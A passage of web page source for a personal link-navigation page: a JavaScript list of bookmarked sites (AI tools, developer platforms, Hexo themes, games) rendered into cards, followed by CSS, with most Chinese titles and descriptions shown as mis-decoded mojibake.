"title": "Radio Garden",            "url": "https://radio.garden/",            "img": "/images/face.png",            "description": "Radio Garden â€“ Explore live radio"        },        {            "title": "ä¸€è¯é€šæŸ¥ ",            "url": "https://getsimnum.caict.ac.cn",            "img": "/images/face.png",            "description": "ç”µè¯å¡ä¸€è¯é€šæŸ¥"        },        {            "title": "å¼¹ç´å§",            "url": "https://www.tan8.com/",            "img": "https://www.tan8.com/static/tan8/style/img/LOGO_s_new2.png?2401",            "description": "ã€Šå¼¹ç´å§ã€‹å®˜ç½‘tan8.com-é’¢ç´è°±å¤§å…¨ï¼Œå‰ä»–è°±å¤§å…¨ï¼Œå­¦é’¢ç´ï¼Œå­¦å‰ä»–ï¼Œå°±æ¥å¼¹ç´å§å¼¹å§"        },        {            "title": "pinterest",            "url": "https://www.pinterest.com/",            "img": "https://www.baidu.com/img/flexible/logo/pc/.png",            "description": "å‘ç°æƒ³è¦å°è¯•çš„é£Ÿè°±ã€å®¶å±…åˆ›æ„ã€æ—¶å°šçµæ„ŸåŠå…¶ä»–åˆ›æ„ç‚¹å­ã€‚"        },        {            "title": "èŠ±ç“£",            "url": "https://huaban.com/",            "img": "https://st0.dancf.com/static/02/202306090204-51f4.png",            "description": "èŠ±ç“£ç½‘ - é™ªä½ åšç”Ÿæ´»çš„è®¾è®¡å¸ˆï¼ˆåˆ›æ„çµæ„Ÿå¤©å ‚ï¼Œæœç´¢ã€å‘ç°è®¾è®¡çµæ„Ÿã€è®¾è®¡ç´ æï¼‰"        },        {            "title": "ä¿®å‰ªmp3",            "url": "https://audiotrimmer.com/cn",            "img": "https://audiotrimmer.com/images/logo.png?v=1 ",            "description": "Audio Trimmer æ˜¯ä¸€ä¸ªç®€å•çš„åœ¨çº¿å·¥å…·ï¼Œå¯è®©æ‚¨å³æ—¶ä¿®å‰ªmp3å’Œå…¶ä»–éŸ³é¢‘æ–‡ä»¶"        },        {            "title": "åˆ¶ä½œico",            "url": "https://www.bitbug.net/",            "img": "",            "description": "åœ¨çº¿åˆ¶ä½œicoå›¾æ ‡ | åœ¨çº¿icoå›¾æ ‡è½¬æ¢å·¥å…· æ–¹ä¾¿åˆ¶ä½œfavicon.ico"        },        {            "title": "ä»Šæ—¥çƒ­æ¦œ",            "url": "https://tophub.today/",            "img": "https://file.ipadown.com/tophub/assets/images/logo.png",            "description": "ä»Šæ—¥çƒ­æ¦œ,Tophub,çƒ­é—¨æ–°é—»,ä»Šæ—¥å¤´æ¡,çƒ­æœ,çƒ­è¯,æ–°é—»èšåˆ"        },        {            "title": "æŠ–éŸ³/TikTok/Biliä¸‹è½½",            "url": "https://snapany.com/zh/tiktok",            "img": "https://snapany.com/favicon.ico",            "description": "TikTok å“”å“©å“”å“© Pinterest Facebook VK Snapchat Threads è§†é¢‘å›¾ç‰‡ SunoéŸ³ä¹ "        }    ]},{    "category": "AI",    "items": [       {            "title": "kimi",            "url": "https://kimi.ai/",            "img": "https://ecmb.bdimg.com/tam-ogel/-1772417172_-552089199_88_88.jpg ",            "description": "kimi"        },      {            "title": "è®¯é£æ˜Ÿç«",            "url": "https://xinghuo.xfyun.cn/",            "img": "https://fc1tn.baidu.com/it/u=1861166136,3857095671&fm=202&mola=new&crop=v1",            "description": "è®¯é£æ˜Ÿç«å¤§æ¨¡å‹ï¼Œç§‘å¤§è®¯é£"        },       {            "title": "è…¾è®¯AIä»£ç ",            "url": "https://copilot.tencent.com/chat",            "img": "https://acc-1258344699.cos.accelerate.myqcloud.com/web/website/assets/logo_text-BjFpEzKf.png",            "description": "è…¾è®¯äº‘ AI ä»£ç åŠ©æ‰‹"        },        {            "title": "AIå¯¼èˆª",            "url": "https://www.ainavpro.com/",            "img": "https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png",            "description": "aiå¯¼èˆª,aiäº§å“,aiå†™ä½œ,chatgpt,äººå·¥æ™ºèƒ½"        },        {            "title": "AIä¸‡èŠ±ç­’",            "url": "https://www.aiwht.com/",            "img": "https://ai-img.aiwht.com/wp-content/uploads/2023/03/1680232059212_AI%E5%88%86%E5%BC%80%E7%9A%84-360x80-1.png",            "description": "AIä¸‡èŠ±ç­’| aiå¯¼èˆª è¿æ¥AIæ–°ä¸–ç•Œ"        },        {            "title": "å¿«æ‰‹-å¯çµ",            "url": "https://kolors.kuaishou.com/",            "img": "https://ali2.a.kwimgs.com/kos/nlav10378/aiwp/assets/kling-logo-zh-5iJvXAUm.png",            "description": "å¿«æ‰‹-å¯çµï¼Œç”Ÿæˆå›¾ç‰‡/è§†é¢‘"        },        {            "title": "é€šæƒ…",            "url": "https://tongyi.aliyun.com/qianwen/",            "img": "https://img.alicdn.com/imgextra/i1/O1CN01asLYeX1WhbsyEZn5u_!!6000000002820-55-tps-56-56.svg",            "description": "é€šæƒ…ã€è¾¾ä¹‰ï¼Œä½ çš„å…¨èƒ½AIåŠ©æ‰‹"        },        {            "title": "è±†åŒ…-å­—èŠ‚",            "url": "https://www.doubao.com/chat/",            "img": "https://ecmb.bdimg.com/tam-ogel/1797406267_1647065546_88_88.jpg",            "description": "è±†åŒ…æ˜¯å­—èŠ‚è·³åŠ¨å…¬å¸åŸºäºäº‘é›€æ¨¡å‹å¼€å‘çš„AIå·¥å…·ï¼Œæä¾›èŠå¤©æœºå™¨äººã€å†™ä½œåŠ©æ‰‹ä»¥åŠè‹±è¯­å­¦ä¹ åŠ©æ‰‹ç­‰åŠŸèƒ½"        },        {            "title": "æ–‡å¿ƒä¸€è¨€",            "url": "https://yiyan.baidu.com/",            "img": "https://nlp-eb.cdn.bcebos.com/static/eb/asset/logo.8a6b508d.png",            "description": "å†™æ–‡æ¡ˆã€æƒ³ç‚¹å­ï¼Œåˆèƒ½é™ªä½ èŠå¤©ã€ç­”ç–‘è§£æƒ‘ã€‚"        },        {            "title": "marscode",            "url": "https://www.marscode.cn/",            "img": "https://p9-arcosite.byteimg.com/tos-cn-i-goo7wpa0wc/8f2f23baeb3c4be4ade7804de39aec5a~tplv-goo7wpa0wc-image.image",            "description": "è±†åŒ…æ——ä¸‹çš„ç¼–ç¨‹åŠ©æ‰‹ï¼Œæä¾›æ™ºèƒ½è¡¥å…¨ã€æ™ºèƒ½é¢„æµ‹ã€æ™ºèƒ½é—®ç­”ç­‰èƒ½åŠ›"        },        {            "title": "suno",            "url": "https://suno.com/",            "img": "https://pbs.twimg.com/profile_images/1807517561598181376/tgNisKbX.jpg",            "description": "Suno is building a future where anyone can make great music."        },        {            "title": "ollama",            "url": "https://ollama.com/ ",            "img": "https://ollama.com/public/ollama.png",            "description": "Run Llama, Phi, Mistral, Gemma   Get up and running with large language models."        },        {            "title": "Cursor",            "url": "https://www.cursor.com/",            "img": "https://avatars.githubusercontent.com/u/126759922?s=48&v=4",            "description": "The AI Code Editor"        },        {            "title": "Aiå¯¼èˆª",            "url": "https://www.ainavpro.com/",            "img": "https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png",            "description": "Aiå¯¼èˆª | æœ€æ–°æœ€å‰æ²¿çš„aiäº§å“"        },        {            "title": "AIå·¥å…·é›†",            "url": "https://ai-bot.cn/",            "img": "https://ai-bot.cn/wp-content/uploads/2023/03/ai-bot-logo-black.png",            "description": "1000+ AIå·¥å…·é›†åˆï¼Œå›½å†…å¤–AI"        }    ]},{    "category": "Web",    "items": [                 {            "title": "æœ‰è°±ä¹ˆ",            "url": "https://yopu.co/",            "img": "https://cdn.yopu.co/img/qrcode_app_download.436360b7.png",            "description": "æœ‰è°±ä¹ˆæ˜¯ä¸“ä¸ºæ‰‹æœºè®¾è®¡çš„å‰ä»–å°¤å…‹é‡Œé‡Œæ›²è°±ä¹¦"        },           {            "title": "ä»€ä¹ˆå€¼å¾—ä¹°",            "url": "https://www.smzdm.com/",            "img": "https://t9.baidu.com/it/u=149758115,4084685086&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "ä»€ä¹ˆå€¼å¾—ä¹° | ç§‘å­¦æ¶ˆè´¹ è®¤çœŸç”Ÿæ´»"        },      {            "title": "vscode",            "url": "https://code.visualstudio.com/ ",            "img": "https://visualstudio.microsoft.com/wp-content/uploads/2019/09/vs-code-responsive-01-1.png",            "description": "visualstudio code "        },      {            "title": "ITæ¡”å­",            "url": "https://www.itjuzi.com/",            "img": "https://static.itjuzi.com/images/fSxSdAmviPF7Cxd0aJvnwOTjTJPAQ5AHOscYuWTq.png",            "description": "ITæ¡”å­ | æ³›äº’è”ç½‘åˆ›ä¸šæŠ•èµ„é¡¹ç›®ä¿¡æ¯æ•°æ®åº“åŠå•†ä¸šä¿¡æ¯æœåŠ¡å•†"        },       {            "title": "åƒé€šå½©è‰²åº“",            "url": "https://www.qtccolor.com/secaiku/",            "img": "https://cdn.qtccolor.com/images/logo.png",            "description": "åœ¨çº¿è‰²å·è‰²å½©æŸ¥è¯¢ - åƒé€šå½©è‰²åº“"        },               {            "title": "X API ",            "url": "https://developer.x.com/en/products/x-api",            "img": "https://ms.bdimg.com/pacific/0/pic/-1749260314_-150371495.jpg",            "description": "X API | Twitter Developer Platform  "        },               {            "title": "IG/FB API",            "url": "https://developers.facebook.com/",            "img": "https://images.sftcdn.net/images/t_app-icon-m/p/f96df87d-926f-4954-bf58-f377a573a630/3410194445/instagram-Instagram_icon.png",            "description": "Instagram API | Facebook for Developers"        },               {            "title": "TgApi",            "url": "https://core.telegram.org/",            "img": "https://t8.baidu.com/it/u=4184704855,1261911938&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "Telegram APIs"        },               {            "title": "TikTokDev",            "url": "https://developers.tiktok.com/",            "img": "https://t7.baidu.com/it/u=3496169845,3458702159&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "TikTok for Developers"        },               {            "title": "å°çº¢ä¹¦å¼€æ”¾å¹³å°",            "url": "https://miniapp.xiaohongshu.com/",            "img": "https://t8.baidu.com/it/u=1809095286,1432785828&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "å°çº¢ä¹¦å¼€æ”¾å¹³å°"        },          {            "title": "ç™½é²¸å‡ºæµ·",            "url": "https://www.baijing.cn/",            "img": " https://www.baijing.cn/static/img/logo_black.png?v=2",            "description": "ç§»åŠ¨å‡ºæµ·,æµ·å¤–å¼€å‘è€…,ç™½é²¸å‡ºæµ·,ç™½é²¸ç¤¾åŒº"        },                 {            "title": "æ— é™éŸ³ä¹",            "url": "http://ws.wxmp3.com/",            "img": "http://ws.wxmp3.com/style/images/logo.png",            "description": "æ— é™éŸ³ä¹ç½‘|MP3æ­Œæ›²å…è´¹ä¸‹è½½,å…¨ç½‘MP3å…è´¹ä¸‹è½½,æ­Œæ›²ä¸‹è½½ç¥å™¨"        },               {            "title": "FreeBuf",            "url": "https://www.freebuf.com/",            "img": "https://www.freebuf.com/images/logoMax.png",            "description": "ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·"        },                 {            "title": "eName",            "url": "https://auction.ename.com/tao",            "img": "https://t9.baidu.com/it/u=2971182524,3144420648&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "æ·˜åŸŸå | åŸŸåäº¤æ˜“å¹³å°ï¼šeName.Com"        },               {            "title": "åˆæ‹äº‘",            "url": "https://www.upyun.com/",            "img": "https://t9.baidu.com/it/u=3516235917,278845167&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "åˆæ‹äº‘ åŠ é€Ÿåœ¨çº¿ä¸šåŠ¡ CDNåŠ é€Ÿ äº‘å­˜å‚¨"        },               {            "title": "UCloud ",            "url": "https://www.ucloud.cn/",            "img": "https://fc1tn.baidu.com/it/u=2776782969,1600626072&fm=202&mola=new&crop=v1",            "description": "äº‘æœåŠ¡å™¨_ UCloudäº‘è®¡ç®—"        },      {            "title": "uç›˜é­”æœ¯å¸ˆ ",            "url": "https://www.sysceo.com/Software",            "img": "https://www.sysceo.com/Public/images/index/logo.png",            "description": "uç›˜é­”æœ¯å¸ˆ PE "        },         {            "title": "ä¸ƒç‰›äº‘",            "url": "https://www.qiniu.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/600520814_947783485_500_500.png",            "description": "ä¸ƒç‰›äº‘,ä¸ƒç‰›äº‘å¤§ä¿ƒ,cdn,å¯¹è±¡å­˜å‚¨,äº‘ä¸»æœº,äº‘çŸ­ä¿¡"        },                {            "title": "åœ¨çº¿Pingæ£€æµ‹",            "url": "https://www.cesu.net/",            "img": "https://www.cesu.net/storage/default/20240422/3537817137167267a7ff56749fd79a407e9a98a25325e34d1a7a31b.jpg",            "description": "å…è´¹Pingæµ‹è¯•å·¥å…·-ç½‘ç«™åœ¨çº¿æµ‹é€Ÿå·¥å…·"        },        {            "title": "äº¬ä¸œå®™æ–¯",            "url": "https://jos.jd.com/",            "img": "https://img12.360buyimg.com/imagetools/s200x200_jfs/t1/118697/14/19219/13380/5f8597bfEe2f1a7a6/28da4f4bd65f005c.png",            "description": "äº¬ä¸œå®™æ–¯å¼€å‘è€…ä¸­å¿ƒã€äº¬ä¸œå¼€æ”¾å¹³å°ã€äº¬ä¸œAPIã€å®™æ–¯å¼€æ”¾å¹³å°ã€äº¬ä¸œå®™æ–¯ã€äº¬ä¸œæ¥å£"        },        {            "title": "æ‹¼å¤šå¤šå¼€æ”¾å¹³å°",            "url": "https://open.pinduoduo.com/",            "img": "https://cdn.pinduoduo.com/upload/home/img/common/pdd_logo_v2.png",            "description": "æ‹¼å¤šå¤šå¼€æ”¾å¹³å°"        },        {            "title": "æŠ–åº—",            "url": "https://op.jinritemai.com/home",            "img": "https://ecmb.bdimg.com/tam-ogel/1876914726_1076566012_88_88.png",            "description": "æŠ–åº—æœåŠ¡å¸‚åœºï¼ŒåŸºäºæŠ–åº—æ•°æ®ä¸æ¥å£ï¼Œèµ‹èƒ½å†…å®¹ç”µå•†ç”Ÿæ€ï¼ŒæœåŠ¡å•†å®¶ä¸å¼€å‘è€…"        },        {            "title": "é˜¿é‡Œç™¾å·",            "url": "https://baichuan.taobao.com/ ",            "img": "https://img.alicdn.com/tps/TB13Od5LpXXXXX_XXXXXXXXXXXX-150-50.png",            "description": "é˜¿é‡Œç™¾å·-é˜¿é‡Œå·´å·´æ— çº¿å¼€æ”¾å¹³å°,ç§»åŠ¨å¼€æ”¾çš„ä¸»é˜µåœ°"        },        {            "title": "é˜¿é‡Œäº‘åŸŸå",            "url": "https://mi.aliyun.com/",            "img": "https://t7.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG",            "description": "é˜¿é‡Œäº‘åŸŸåäº¤æ˜“ "        },        {            "title": "èšåç½‘",            "url": "https://www.juming.com/ykj/",            "img": "https://www.juming.com/pub/img/new/logo.png",            "description": "èšåç½‘æä¾›ä¸€å£ä»·åŸŸåè´­ä¹°"        },        {            "title": "çˆ±åç½‘",            "url": "https://am.22.cn/ykj",            "img": "https://am.22.cn/images/logo.png",            "description": "ä¸€å£ä»·åŸŸåäº¤æ˜“-åŸŸåä¹°å–äº¤æ˜“ä¸­å¿ƒ-çˆ±åç½‘AM.22.CN"        }  ,       {            "title": "apple",            "url": "https://apple.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/2066431224_743698567_88_88.png",            "description": "apple"        },             {            "title": "è„‰è„‰",            "url": "https://maimai.cn/",            "img": "https://s.taou.com/static/images/website/pc/logo.png",            "description": "è„‰è„‰,è„‰è„‰å®˜ç½‘,è„‰è„‰APP,maimai"        },      {            "title": "AI tool",            "url": "https://saasaitools.com/",            "img": "https://saasaitools.com/wp-content/uploads/2023/12/saasaitools_logowhite-1536x327.webp",            "description": " SaaS AI Tools AI tool"        },      {            "title": "Newest AI Tools",            "url": "https://theresanaiforthat.com/",            "img": "https://theresanaiforthat.com/favicon-large.png",            "description": "Newest AI Tools  There's An AI For ThatÂ® - Discover The Newest And Best AI Tools"        },      {            "title": "uni-app",            "url": "https://dcloud.io/ ",            "img": "https://t7.baidu.com/it/u=1571091084,4105095099&fm=217&app=126&size=f242,150&n=0&f=PNG",            "description": "uni-app,uniapp,HBuilderX "        },         {            "title": "å°ç±³",            "url": "https://www.mi.com/",            "img": "https://ms.bdimg.com/pacific/0/pic/1990065745_1296829299.jpg",            "description": "å°ç±³ æ¯ä¸ªäººéƒ½èƒ½äº«å—ç§‘æŠ€å¸¦æ¥çš„ç¾å¥½ç”Ÿæ´»"        },        {            "title": "forbes",            "url": "https://www.forbes.com/billionaires/ ",            "img": "https://www.forbeschina.com/static/images/logo.png",            "description": "forbesç¦å¸ƒæ–¯"        },{                        title: "åä¸º",                        url: "https://consumer.huawei.com/",                        img: "https://t9.baidu.com/it/u=2184693209,621087203&fm=190&app=131&size=f242,150&n=0&f=JPEG",                        description: "åä¸º, HUAWEI, HUAWEIå®˜ç½‘, åä¸ºå®˜ç½‘, åä¸ºç½‘ç«™, åä¸ºæ¶ˆè´¹è€…å®˜ç½‘, åä¸ºäº§å“, åä¸ºæ–°å“"                    }    ]},{    "category": "Hexo",    "items": [        {            "title": "Hipaper",            "url": "https://github.com/iTimeTraveler/hexo-theme-hipaper",            "img": "https://hexo.io/themes/screenshots/Hipaper.jpg",            "description": "A fashional newspaper, blog theme for Hexo."        },        {            "title": "Fluid ",            "url": "https://github.com/fluid-dev/hexo-theme-fluid",            "img": "https://hexo.io/themes/screenshots/Fluid.jpg",            "description": "An elegant and light theme"        },        {            "title": "keep",            "url": "https://github.com/XPoet/hexo-theme-keep",            "img": "https://hexo.io/themes/screenshots/Keep.jpg",            "description": "keep writing keep loving"        },        {            "title": "A4",            "url": "https://github.com/HiNinoJay/hexo-theme-A4",            "img": "https://hexo.io/themes/screenshots/A4.jpg",            "description": "A hexo theme that looks like an A4 paper."        },        {            "title": "Edinburgh",            "url": "https://github.com/sharvaridesai/hexo-theme-edinburgh",            "img": "https://hexo.io/themes/screenshots/Edinburgh.jpg",            "description": "Clean, beautiful portfolio theme"        },        {            "title": "Freemind",            "url": "https://github.com/wzpan/hexo-theme-freemind",            "img": "https://hexo.io/themes/screenshots/Freemind.jpg",            "description": "Fully taking advantages of Bootstrap"        },        {            "title": "Aurora ",            "url": "https://github.com/auroral-ui/hexo-theme-aurora",            "img": "https://hexo.io/themes/screenshots/Aurora.jpg",            "description": "Futuristic auroral Hexo theme."        },        {            "title": "Reimu",            "url": "https://github.com/D-Sketon/hexo-theme-reimu",            "img": "https://hexo.io/themes/screenshots/Reimu.jpg",            "description": "ä¸€æ¬¾åšä¸½çµæ¢¦é£æ ¼çš„Hexoä¸»é¢˜ | A Hakurei Reimu style Hexo theme."        },        {            "title": "Lightx",            "url": "https://github.com/songquanpeng/hexo-theme-lightx",            "img": "https://hexo.io/themes/screenshots/Lightx.jpg",            "description": "A pure and simple Hexo theme"        },        {            "title": "Terminal ",            "url": "https://github.com/lazysheep666/terminal_theme",            "img": "https://hexo.io/themes/screenshots/Terminal.jpg",            "description": "A simple and clean theme"        },        {            "title": "Replica ",            "url": "https://github.com/sabrinaluo/hexo-theme-replica",            "img": "https://hexo.io/themes/screenshots/Replica.jpg",            "description": "A github style replication theme"        },        {            "title": "leedom",            "url": "https://github.com/leedom92/hexo-theme-leedom",            "img": "https://hexo.io/themes/screenshots/leedom.jpg",            "description": "A pure hexo theme."        },        {            "title": "Meow",            "url": "https://github.com/chanwj/hexo-theme-meow",            "img": "https://hexo.io/themes/screenshots/Meow.jpg",            "description": "A cute and bright hexo theme suitable for literary creation ( e.g. serial novel, fanfiction )."        },        {            "title": "Hiero",            "url": "https://github.com/iTimeTraveler/hexo-theme-hiero",            "img": "https://hexo.io/themes/screenshots/Hiero.jpg",            "description": "A free magazine and blog style theme"        },        {            "title": "Vita ",            "url": "https://github.com/Harendra1993/vita",            "img": "https://hexo.io/themes/screenshots/Vita.png",            "description": "A simple and minimal Hexo resume theme"        },        {            "title": "Sakura ",            "url": "https://github.com/honjun/hexo-theme-sakura",            "img": "https://hexo.io/themes/screenshots/Sakura.jpg",            "description": "A beautiful theme"        },        {            "title": "Nayo ",            "url": "https://github.com/Lemonreds/hexo-theme-nayo",            "img": "https://hexo.io/themes/screenshots/Nayo.jpg",            "description": "A clean theme"        },        {            "title": "xoxo-plus ",            "url": "https://github.com/fooying/hexo-theme-xoxo-plus",            "img": "https://hexo.io/themes/screenshots/xoxo-plus.jpg",            "description": "A Simple Template"        },        {            "title": "Waline",            "url": "https://waline.js.org/",            "img": "https://waline.js.org/logo.png",            "description": "ä¸€æ¬¾ç®€æ´ã€å®‰å…¨çš„è¯„è®ºç³»ç»Ÿã€‚"        },        {            "title": "Valine",            "url": "https://valine.js.org/",            "img": "https://valine.js.org/images/valine.png",            "description": "ä¸€æ¬¾å¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„æ— åç«¯è¯„è®ºç³»ç»Ÿã€‚"        },        {            "title": "æ¥å¿…åŠ›",            "url": "https://livere.com/",            "img": "https://livere.com/img/nav/logo_livere_main-colored_zh.png",            "description": "æ¥å¿…åŠ›æä¾›ç¤¾äº¤åŒ–è¯„è®ºï¼Œç¤¾äº¤åŒ–ç™»å½•ï¼Œæˆ‘çš„é¡µé¢ï¼ŒSNSåˆ†äº«æŒ‰é’®"        }    ]},{                category: "Fun",                items: [       {            "title": "å…°åšåŸºå°¼",            "url": "https://www.lamborghini.com/ ",            "img": "https://t9.baidu.com/it/u=637130529,2781676095&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "å…°åšåŸºå°¼æ±½è½¦å®˜æ–¹ç½‘ç«™"        },                          {            "title": "vivo",            "url": "https://www.vivo.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png",            "description": " vivoï¼Œvivoå®˜ç½‘ï¼Œvivoæ™ºèƒ½æ‰‹æœº"        },                    {                        title: "å“”å“©å“”å“©",                        url: "https://www.bilibili.com/",                        img: "https://activity.hdslb.com/zzjs/20160608appDownload/img/pc/tittle.png",                        description: "å“”å“©å“”æ¶›"                    },                    {                        title: "youtube",                        url: "https://www.youtube.com/",                        img: "https://t8.baidu.com/it/u=1745702888,2743145560&fm=217&app=126&size=f242,150&n=0&f=JPEG",                        description: "youtube"                    }                ]            },            {                category: "Game",                items: [                   {            "title": "byrut ",            "url": "https://byrutgame.org/",            "img": "https://byrutgame.org/templates/byrut_upd/images/logo.png",            "description": "byrut CĞºĞ°Ñ‡Ğ°Ñ‚ÑŒ Ğ¸Ğ³Ñ€Ñ‹ Ğ½Ğ° "        },       {            "title": "èƒèŸ¹",            "url": "https://www.pxb7.com/",            "img": "https://www.pxb7.com/img/logo.45da5e95.png",            "description": "èƒèŸ¹æ¸¸æˆè´¦å·äº¤æ˜“ä»£å”®å¹³å°"        },       {            "title": "äº¤æ˜“çŒ«",            "url": "https://www.jiaoyimao.com/",            "img": "https://t9.baidu.com/it/u=3394740754,1697665746&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "äº¤æ˜“çŒ«_æ‰‹æ¸¸äº¤æ˜“å¹³å°"        },                    {                        title: "é›·ç”µæ¨¡æ‹Ÿå™¨",                        url: "https://www.ldmnq.com/",                        img: "https://res.ldmnq.com/gw/static/gw_ch/dist/client/img/logo.c0fc5c8.svg",                        description: "é›·ç”µå®‰å“æ¨¡æ‹Ÿå™¨"                    },                    {                        title: "biubiuåŠ é€Ÿå™¨",                        url: "https://www.biubiu001.com/",                        img: "https://res.biubiu001.com/web/www/img/header_biubiu_logo.3f871d8e.png",                        description: "biubiuåŠ é€Ÿå™¨_å…è´¹çš„æ‰‹æ¸¸åŠ é€Ÿå™¨_ç”µç«çº§PCç½‘æ¸¸åŠ é€Ÿå™¨"                    },                    {                        title: "isaac wiki",                        url: "https://isaac.huijiwiki.com/wiki/T130",                        img: "https://av.huijiwiki.com/site_avatar_isaac_l.png?1732216641",                        description: "isaac wiki"                    }                ]            }        ];        function renderCards(data) {            let html = '';            data.forEach(category => {                html += `<div class="d-flex flex-fill">                            <h4 class="text-gray text-lg mb-4">                                <i class="site-tag iconfont icon-tag icon-lg mr-1" id="${category.category}"></i>                               ${category.category}                            </h4>                            <div class="flex-fill"></div>                        </div>                        <div class="row">`;                category.items.forEach(item => {                    html += `                        <div class="url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a">                            <div class="url-body default">                                <a href="${item.url}" target="_blank" class="card no-c mb-4">                                    <div class="card-body">                                        <div class="url-content d-flex align-items-center">                                            <div class="url-img mr-2 d-flex align-items-center justify-content-center">                                                <img class="lazy loaded" src="${item.img}" onerror="javascript:this.src='/images/logo.svg'" alt="${item.title}">                                            </div>                                            <div class="url-info flex-fill">                                                <div class="text-sm overflowClip_1">                                                    <strong>${item.title}</strong>                                                </div>                                                <p class="overflowClip_1 m-0 text-muted text-xs">${item.description}</p>                                            </div>                                        </div>                                    </div>                                </a>                                <a href="${item.url}" class="togo text-center text-muted is-views">                                    <i class="iconfont icon-goto"></i>                                </a>                            </div>                        </div>`;                });                html += `</div>`;            });            return html;        }        document.getElementById('app3').innerHTML = renderCards(data);    </script><!-- https://banjinmei.github.io/2023/02/20/T100/https://camp.honorofkings.com/studio?home=%2Fembed%2Fhok-studio%2Fprofile#/home https://www.itshujia.com/read/go-zero-cloud/333.html   go lang sutdyhttps://banjinmei.github.io/2024/04/21/HarmonyOS-Base/  myhmhttps://banjinmei.github.io/2024/06/05/Azure-OpenAI%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/ ai--><style>@media (min-width:1200px){.col-xl-5a{flex:0 0 20%;max-width:20%}.col-xl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xl-7a{flex:0 0 14.285714%;max-width:14.285714%}.col-xl-8a{flex:0 0 12.5%;max-width:12.5%}}@media (min-width:1400px){ .container-lg{max-width:1340px}}@media (min-width: 1680px){.d-xxl-block{display:block!important}.col-xxl-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-xxl-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-xxl-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xxl-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-xxl-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-xxl-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-xxl-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-xxl-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-xxl-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-xxl-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-xxl-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-xxl-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-xxl-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.col-xxl-5a{flex:0 0 20%;max-width:20%}.col-xxl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xxl-7a{flex:0 0 14.285714%;max-width:14.285714%}.col-xxl-8a{flex:0 0 12.5%;max-width:12.5%}.col-xxl-10a{flex:0 0 10%;max-width:10%}.mx-xxl-n5{margin-left:-5rem!important;margin-right:-5rem!important}.container-lg{max-width:1400px}}.row {    display: -ms-flexbox;    display: flex;    -ms-flex-wrap: wrap;    flex-wrap: wrap;    margin-right: -15px;    margin-left: -15px}.size-50{width:50px;height:50px}.size-70{width:70px;height:70px}.flex-wrap-reverse {    -ms-flex-wrap: wrap-reverse!important;    flex-wrap: wrap-reverse!important}.flex-fill {    -ms-flex: 1 1 auto!important;    flex: 1 1 auto!important}.flex-grow-0 {    -ms-flex-positive: 0!important;    flex-grow: 0!important}.flex-grow-1 {    -ms-flex-positive: 1!important;    flex-grow: 1!important}.flex-shrink-0 {    -ms-flex-negative: 0!important;    flex-shrink: 0!important}.flex-shrink-1 {    -ms-flex-negative: 1!important;    flex-shrink: 1!important}.justify-content-start {    -ms-flex-pack: start!important;    justify-content: flex-start!important}.justify-content-end {    -ms-flex-pack: end!important;    justify-content: flex-end!important}.justify-content-center {    -ms-flex-pack: center!important;    justify-content: center!important}.text-gray{color:#555}.overflowClip_1{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:1;-webkit-box-orient:vertical}.overflowClip_1{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block!important}.overflowClip_2{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:2;-webkit-box-orient:vertical}.url-card .url-body{transform:translateY(0px);-webkit-transform:translateY(0px);-moz-transform:translateY(0px);-webkit-transition:all 0.3s ease;-moz-transition:all 0.3s ease;-o-transition:all 0.3s ease;transition:all 0.3s ease}.url-card .url-body:hover{transform:translateY(-6px);-webkit-transform:translateY(-6px);-moz-transform:translateY(-6px);box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-webkit-box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-moz-box-shadow:0 26px 40px -24px rgba(0,36,100,.3)}.url-card .url-like{position:absolute;top:5px;right:10px;opacity:0;transition:opacity .3s}.url-card .url-body:hover .url-like{opacity:1}.url-card .url-info{overflow:hidden;padding-right:5px}.url-card .url-goto-after{height:24px;border-top:1px solid rgba(136,136,136,.2)}.url-card .url-goto{position:absolute;bottom:0;left:0px;right:0}.url-card .card-body{padding:.938rem}.url-card 